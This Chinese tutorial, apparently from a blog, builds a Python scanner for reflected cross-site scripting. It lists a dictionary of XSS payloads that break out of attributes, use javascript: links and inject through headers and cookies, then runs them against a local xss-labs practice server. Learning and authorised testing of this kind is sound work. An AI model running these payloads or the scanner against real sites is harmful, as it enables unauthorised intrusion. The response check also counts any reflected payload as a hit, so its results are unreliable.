[TOC]

# ==python开发XSS扫描器==

## 一、基本思路

1、整体上的思路是发送一个带有payload参数值的请求，从响应中判断是否存在payload（发射行XSS）

2、准备一份字典，尽可能包含多的Payload，并给每一个Payload进行分类。

3、针对不同类型的payload，应该有不同的发送请求的方式，也需要有不同的相应检测的手段。

4、尽可能的精准的检测，避免网页上只要存在payload就算数的这种情况，而是要看payload是一个普通字符串还是确实为可执行的。

5、此类XSS扫描工具，通常比较适合与扫描反射性XSS，不太适用于存储型。如果是存储型XSS的话，开发一个工具，是无法明确知道响应是在哪个页面的，主要就是这个问题，当然，按理说也是可以解决的。

6、使用python也可以处理HTML实体字符转换

7、针对URL地址栏或POST请求正文的参数有多个的情况，需要分解参数，每个参数都需要赋值为payload的值。

## 二、代码实现

#### 1、字典文件

Normal表示payload拥有独立的位置，不能处在字符串里面或什么属性当中，这种情况下，payload的前面第二个位置一定不会是等号，这种情况属于字符串的情况，比如 `="xxx"` 

Prop表示payload存在于属性值时

```
Normal:<script>alert(1)</script>
Prop:x" onclick="alert(2)
Prop:x' onclick='alert(3)
Prop:x" onclick="alert(4)
Prop:x"><a href="javascript:alert(5)">yy</a>
Prop:x" ONclick="alert(6)
Double:x" oonnclick="alert(7)
Escape:javascript:alert(8)
Prop:x" onclick="alert(10)" type="button
Referer:x" onclick="alert(11)" type="button
User-Agent:x" onclick="alert(12)" type="button
Cookie:user=x" onclick="alert(13)" type="button
Replace:test<img%0asrc=1%0aonerror=alert(16)>
Normal:1111 onmouseover=alert(17)
Normal:1111 onmouseover=alert(18)
```

#### 2、python代码

```python
import requests

#针对html实体字符编码
def Entity_html(source):
    entity_html = ''
    for c in source:
        entity_html += '&#x' + hex(ord(c)).replace('0x','') + ';'
    return entity_html

#从响应中检测payload是否有效，类似于我们去看注入后的源代码的目的是一样的
def check_resp(resp,payload,type) :
    index = resp.find(payload)
    profix = resp[index-2:index-1]
    if(type=='Normal' and profix!='=' and index > 0):
        return True
    elif(type=='Prop' and profix=='=' and index > 0):
        return True
    elif(index > 0):
        return True

    return False

#主要扫描功能
def xss_scan(location):
    #分解URL地址和参数
    URL = location.split('?')[0]
    param_list = location.split('?')[1].split('&')
    with open('./xssdict.txt',mode='r') as file:
        payload_list = file.readlines()

    for param in param_list :
        key = param.split('=')[0]
        for payload in payload_list:
            type = payload.split(':', 1)[0]
            payload = payload.strip().split(':', 1)[1]
            if (type == 'Referer' or type=='User-Agent' or type=='Cookie'):
                header = {type:payload}
                resp = requests.get(url=URL,headers = header)
            else:
                params = {}
                if(type == 'Escape'):
                    params[key] = Entity_html(payload)
                else:
                    params[key] = payload
                resp = requests.get(url=URL, params=params)
            if check_resp(resp.text,payload,type):
                print(f'此处存在XSS漏洞 {payload}')

if __name__ == '__main__':
    # target='http://192.168.1.9/xss-labs/level5.php?keyword=xxx'
    # target='http://192.168.1.9/xss-labs/level8.php?keyword=xxx'
    target='http://192.168.1.9/xss-labs/level17.php?arg01=a&arg02=b'
    xss_scan(target)

#下方为调试代码
    # param_list = target.split('?')[1].split('&')
    # print(len(param_list))
    # index = target.find('//')
    # profix = target[index-2:index-1]
    # print(profix)
    # str = Entity_html(target)
    # print(str)

    # for payload in payload_list:
    #     type = payload.split(':',1)[0]
    #     payload = payload.strip().split(':',1)[1]
    #     params = {}

    # url = 'http://192.168.1.9/xss-labs/level8.php?keyword=&#x006a;&#x0061;&#x0076;&#x0061;&#x0073;&#x0063;&#x0072;&#x0069;&#x0070;&#x0074;&#x003a;&#x0061;&#x006c;&#x0065;&#x0072;&#x0074;&#x0028;&#x0038;&#x0029;&submit=添加友情链接'
    # resp = requests.get(url=url)
    # print(resp.text)
```
